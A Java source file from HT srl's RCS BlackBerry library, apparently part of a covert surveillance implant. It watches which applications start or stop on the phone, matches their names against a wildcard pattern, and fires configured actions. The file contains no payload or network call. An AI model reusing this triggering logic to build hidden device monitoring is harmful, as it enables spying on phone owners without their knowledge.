//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ProcessEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.Messages;
import blackberry.action.Action;
import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.ApplicationObserver;
import blackberry.debug.Check;
import blackberry.utils.WChar;

/**
 * The Class ProcessEvent.
 */
public final class EventProcess extends Event implements ApplicationObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug(
            "ProcessEvent", DebugLevel.INFORMATION); //$NON-NLS-1$
    //#endif

    private int actionOnEnter, actionOnExit;
    private boolean active = false;
    private String starname;
    private boolean window;
    private boolean focus;

    public boolean parse(ConfEvent conf) {
        try {
            window = conf.getBoolean(Messages.getString("v.0")); //$NON-NLS-1$
            focus = conf.getBoolean(Messages.getString("v.1")); //$NON-NLS-1$
            starname = conf.getString(Messages.getString("v.2")); //$NON-NLS-1$
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.trace(" Error: params FAILED");//$NON-NLS-1$
            //#endif

            return false;
        }

        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart"); //$NON-NLS-1$
        //#endif
        AppListener.getInstance().addApplicationObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualLoop() {
        //#ifdef DEBUG
        debug.trace("actualRun"); //$NON-NLS-1$
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop"); //$NON-NLS-1$
        //#endif
        AppListener.getInstance().removeApplicationObserver(this);
        onExit();
    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        String started, stopped;

        if (!window) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: PROCESS (mod)"); //$NON-NLS-1$
            //#endif
            started = startedMod;
            stopped = stoppedMod;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: WINDOWS (name)"); //$NON-NLS-1$
            //#endif
            started = startedName;
            stopped = stoppedName;
        }

        if (actionOnEnter != Action.ACTION_NULL && matchStar(starname, started)) {
            //#ifdef DEBUG
            debug.info("triggering enter: " + starname); //$NON-NLS-1$
            //#endif
            onEnter();
        }

        if (actionOnExit != Action.ACTION_NULL && matchStar(starname, stopped)) {
            //#ifdef DEBUG
            debug.info("triggering exit: " + starname); //$NON-NLS-1$
            //#endif
            onExit();
        }
    }

    static boolean matchStar(String wildcardProcess, String processName) {

        if (processName == null) {
            return (wildcardProcess == null);
        }

        for (;;) {

            if (wildcardProcess.length() == 0) {
                return (processName.length() == 0);
            }

            if (wildcardProcess.charAt(0) == '*') {
                wildcardProcess = wildcardProcess.substring(1);
                if (wildcardProcess.length() == 0) {
                    return true;
                }

                if (wildcardProcess.charAt(0) != '?'
                        && wildcardProcess.charAt(0) != '*') {
                    int len = processName.length();
                    for (int i = 0; i < len; i++) {
                        char c = processName.charAt(0);
                        processName = processName.substring(1);
                        String tp = wildcardProcess.substring(1);
                        if (c == wildcardProcess.charAt(0)
                                && matchStar(tp, processName)) {
                            return true;
                        }
                    }
                    return false;
                }

                for (int i = 0; i < processName.length(); i++) {
                    char c = processName.charAt(i);
                    processName = processName.substring(1);
                    if (matchStar(wildcardProcess, processName)) {
                        return true;
                    }
                }
                return false;
            }

            if (processName.length() == 0) {
                return false;
            }

            if (wildcardProcess.charAt(0) != '?'
                    && wildcardProcess.charAt(0) != processName.charAt(0)) {
                return false;
            }

            processName = processName.substring(1);
            wildcardProcess = wildcardProcess.substring(1);
        }

        //NOTREACHED 
    }

}
